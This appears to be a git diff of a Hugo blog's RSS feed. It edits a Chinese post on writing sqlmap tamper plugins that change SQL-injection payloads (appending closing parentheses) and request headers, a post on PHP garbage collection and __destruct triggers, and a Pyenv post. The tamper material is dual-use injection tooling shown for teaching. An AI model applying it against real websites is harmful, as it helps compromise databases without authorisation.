@@ -5,11 +5,11 @@
         <link>http://main1o.github.io/</link>
         <description>Recent content on main1o&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
-        <language>zh-cn</language>
-        <lastBuildDate>Thu, 18 May 2023 11:31:40 +0800</lastBuildDate><atom:link href="http://main1o.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <language>en-us</language>
+        <lastBuildDate>Thu, 18 May 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://main1o.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Pyenv</title>
         <link>http://main1o.github.io/p/pyenv/</link>
-        <pubDate>Thu, 18 May 2023 11:31:40 +0800</pubDate>
+        <pubDate>Thu, 18 May 2023 00:00:00 +0000</pubDate>
         
         <guid>http://main1o.github.io/p/pyenv/</guid>
         <description>&lt;img src="http://main1o.github.io/image31.png" alt="Featured image of post Pyenv" /&gt;&lt;h1 id=&#34;pyenv&#34;&gt;Pyenv&lt;/h1&gt;
@@ -150,13 +150,39 @@
 </description>
         </item>
         <item>
-        <title>Sqlmap_tamper</title>
+        <title>sqlmap_tamper</title>
         <link>http://main1o.github.io/p/sqlmap_tamper/</link>
-        <pubDate>Thu, 18 May 2023 09:37:33 +0800</pubDate>
+        <pubDate>Wed, 18 Jan 2023 00:00:00 +0000</pubDate>
         
         <guid>http://main1o.github.io/p/sqlmap_tamper/</guid>
-        <description>&lt;img src="http://main1o.github.io/image46.png" alt="Featured image of post Sqlmap_tamper" /&gt;&lt;h1 id=&#34;tamper&#34;&gt;tamper&lt;/h1&gt;
-&lt;p&gt;&lt;code&gt;sqlmap\tamper&lt;/code&gt; 有非常灵活且自定义高的插件 Demo:&lt;/p&gt;
+        <description>&lt;img src="http://main1o.github.io/CachedImage_2880_1800_POS4.jpg" alt="Featured image of post sqlmap_tamper" /&gt;&lt;h1 id=&#34;sqlmap_tamper&#34;&gt;sqlmap_tamper&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ndash;tamper [插件名]&lt;/p&gt;
+&lt;p&gt;sqlmap/tamper    插件目录&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_36950158/article/details/123688002&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;sqlmap脚本模块的用法&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;CONCAT_WS  和concat()一样,将多个字符串连接成一个字符串&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;JSON_ARRAYAGG()&lt;/code&gt; 函数将指定的列或者表达式的值聚合为一个 JSON 数组&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mysql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;JSON_ARRAYAGG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+------------------------------------------------------------+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;JSON_ARRAYAGG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                        &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+------------------------------------------------------------+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;main1o&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;main1o&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;main1o&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;main1o&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;main1o&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;demo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+------------------------------------------------------------+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;sqlmap\tamper&lt;/code&gt; 有非常灵活且自定义高的插件 Demo:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -197,20 +223,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;定义优先级的类 &lt;code&gt;sqlmap\lib\core\enums.py&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518084100417.png&#34;
-	width=&#34;528&#34;
-	height=&#34;420&#34;
-	srcset=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518084100417_huce62e25cc2d2e43e848390661d076fad_16751_480x0_resize_box_3.png 480w, http://main1o.github.io/p/sqlmap_tamper/image-20230518084100417_huce62e25cc2d2e43e848390661d076fad_16751_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20230518084100417&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;125&#34;
-		data-flex-basis=&#34;301px&#34;
-	
-&gt;&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -231,21 +244,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HIGHEST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518085641555.png&#34;
-	width=&#34;824&#34;
-	height=&#34;145&#34;
-	srcset=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518085641555_hu36ec4b60457fd0acac316000104712fb_25150_480x0_resize_box_3.png 480w, http://main1o.github.io/p/sqlmap_tamper/image-20230518085641555_hu36ec4b60457fd0acac316000104712fb_25150_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20230518085641555&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;568&#34;
-		data-flex-basis=&#34;1363px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;h3 id=&#34;插件提示&#34;&gt;插件提示&lt;/h3&gt;
+&lt;/div&gt;&lt;h3 id=&#34;插件提示&#34;&gt;插件提示&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -256,22 +255,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;singleTimeWarnMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;插件&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;basename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__file__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;只针对&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DBMS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MYSQL&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;参考 &lt;code&gt;sqlmap\lib\core\enums.py&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518085008967.png&#34;
-	width=&#34;559&#34;
-	height=&#34;919&#34;
-	srcset=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518085008967_hu9c8cf005e3263460f0134cc327cf98a9_41368_480x0_resize_box_3.png 480w, http://main1o.github.io/p/sqlmap_tamper/image-20230518085008967_hu9c8cf005e3263460f0134cc327cf98a9_41368_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20230518085008967&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;60&#34;
-		data-flex-basis=&#34;145px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;h3 id=&#34;tamper-1&#34;&gt;tamper&lt;/h3&gt;
+&lt;/div&gt;&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;参考 &lt;code&gt;sqlmap\lib\core\enums.py&lt;/code&gt;&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;tamper&#34;&gt;tamper&lt;/h3&gt;
 &lt;p&gt;核心函数，处理payload 和请求头 需要实现的功能都在这里&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;payload  为sqlmap注入原始语句&lt;/li&gt;
@@ -282,20 +269,7 @@
 &lt;p&gt;虽然sqlmap默认注入会自动闭合多个括号的参数，但是这里还是想写一下&amp;hellip;..&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;测试的php代码:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518090620731.png&#34;
-	width=&#34;1153&#34;
-	height=&#34;227&#34;
-	srcset=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518090620731_hu798ac043547859924a1620ba6670ef2b_50523_480x0_resize_box_3.png 480w, http://main1o.github.io/p/sqlmap_tamper/image-20230518090620731_hu798ac043547859924a1620ba6670ef2b_50523_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20230518090620731&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;507&#34;
-		data-flex-basis=&#34;1219px&#34;
-	
-&gt;&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
 &lt;p&gt;把原始注入的payload加上5个右括号用来闭合：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -346,20 +320,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;User-Agent&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;main1o&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518093044459.png&#34;
-	width=&#34;788&#34;
-	height=&#34;407&#34;
-	srcset=&#34;http://main1o.github.io/p/sqlmap_tamper/image-20230518093044459_hub3a18ff7a93302a2282a2b268937834c_36175_480x0_resize_box_3.png 480w, http://main1o.github.io/p/sqlmap_tamper/image-20230518093044459_hub3a18ff7a93302a2282a2b268937834c_36175_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20230518093044459&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;193&#34;
-		data-flex-basis=&#34;464px&#34;
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;!-- raw HTML omitted --&gt;
 &lt;p&gt;完整代码：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -418,12 +379,12 @@
 &lt;/div&gt;</description>
         </item>
         <item>
-        <title>PHP底层_GC_垃圾回收机制</title>
-        <link>http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</link>
-        <pubDate>Fri, 20 Jan 2023 00:00:00 +0000</pubDate>
+        <title>PHP_GC垃圾回收机制</title>
+        <link>http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</link>
+        <pubDate>Fri, 09 Sep 2022 00:00:00 +0000</pubDate>
         
-        <guid>http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</guid>
-        <description>&lt;img src="http://main1o.github.io/%E5%A4%AA%E7%A9%BA%E5%A2%99%E7%BA%B8.jpg" alt="Featured image of post PHP底层_GC_垃圾回收机制" /&gt;&lt;h1 id=&#34;php底层-gc-垃圾回收机制&#34;&gt;PHP底层 GC 垃圾回收机制&lt;/h1&gt;
+        <guid>http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</guid>
+        <description>&lt;img src="http://main1o.github.io/image46.png" alt="Featured image of post PHP_GC垃圾回收机制" /&gt;&lt;h1 id=&#34;php底层-gc-垃圾回收机制&#34;&gt;PHP底层 GC 垃圾回收机制&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/manual/zh/features.gc.refcounting-basics.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;PHP: 引用计数基本知识 - Manual&lt;/a&gt;&lt;/p&gt;
@@ -446,10 +407,10 @@
 &lt;/blockquote&gt;
 &lt;p&gt;直接把&lt;code&gt;$a&lt;/code&gt;赋值给&lt;code&gt;$b&lt;/code&gt;之后，&lt;code&gt;$b&lt;/code&gt;修改并不会对&lt;code&gt;$a&lt;/code&gt;任何影响，可以看到2次输出都是&lt;code&gt;main1o&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;变量&lt;code&gt;$a&lt;/code&gt;引用计数值&lt;code&gt;refcount&lt;/code&gt;也为1，并且&lt;code&gt;is_ref&lt;/code&gt;也是false&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657.png&#34;
 	width=&#34;602&#34;
 	height=&#34;374&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657_hu1de70d15941b9226eeb9f95b24893657_28105_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657_hu1de70d15941b9226eeb9f95b24893657_28105_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657_hu1de70d15941b9226eeb9f95b24893657_28105_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657_hu1de70d15941b9226eeb9f95b24893657_28105_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120132330657&#34;
@@ -462,10 +423,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;对象的深拷贝  用clone函数拷贝出一个完全一样的对象，修改该对象，并不会影响原始对象&lt;/p&gt;
 &lt;p&gt;修改&lt;code&gt;$a&lt;/code&gt;对象，只会对&lt;code&gt;$b&lt;/code&gt;对象有影响，并不会对&lt;code&gt;$c&lt;/code&gt;对象有任何影响&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985.png&#34;
 	width=&#34;438&#34;
 	height=&#34;342&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985_hu203ac5e83798495d20a8550afc078184_23242_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985_hu203ac5e83798495d20a8550afc078184_23242_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985_hu203ac5e83798495d20a8550afc078184_23242_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985_hu203ac5e83798495d20a8550afc078184_23242_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120134851985&#34;
@@ -482,10 +443,10 @@
 &lt;/blockquote&gt;
 &lt;p&gt;使用&lt;code&gt;&amp;amp;&lt;/code&gt;来使用自定义引用变量，我们对&lt;code&gt;$a&lt;/code&gt;进行修改 直接影响了&lt;code&gt;$b&lt;/code&gt; “main1o” &amp;ndash;&amp;gt; &amp;ldquo;ikun&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;就是&lt;code&gt;$a&lt;/code&gt; 和&lt;code&gt;$b&lt;/code&gt;都指向内存中的同一块地址&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873.png&#34;
 	width=&#34;607&#34;
 	height=&#34;354&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873_hu1e41287177b147b4aad1be9296cba66c_28204_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873_hu1e41287177b147b4aad1be9296cba66c_28204_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873_hu1e41287177b147b4aad1be9296cba66c_28204_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873_hu1e41287177b147b4aad1be9296cba66c_28204_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120140131873&#34;
@@ -517,10 +478,10 @@
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;手动销毁对象&lt;code&gt;unset()&lt;/code&gt;触发了&lt;code&gt;$a&lt;/code&gt;对象中的析构函数。提前输出了 1__destruct()&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001.png&#34;
 	width=&#34;606&#34;
 	height=&#34;629&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001_hu061b4060c96bd52b782080f2df917f77_54584_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001_hu061b4060c96bd52b782080f2df917f77_54584_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001_hu061b4060c96bd52b782080f2df917f77_54584_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001_hu061b4060c96bd52b782080f2df917f77_54584_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120144320001&#34;
@@ -533,10 +494,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;还有对象引用被视为null 也会触发，这里举个例子&lt;/p&gt;
 &lt;p&gt;变量赋值都是 &lt;strong&gt;自右向左&lt;/strong&gt; 所以数组中的第二个元素0 覆盖了对象失去了引用，那么就满足触发GC回收了。即触发&lt;code&gt;__destruct&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356.png&#34;
 	width=&#34;612&#34;
 	height=&#34;648&#34;
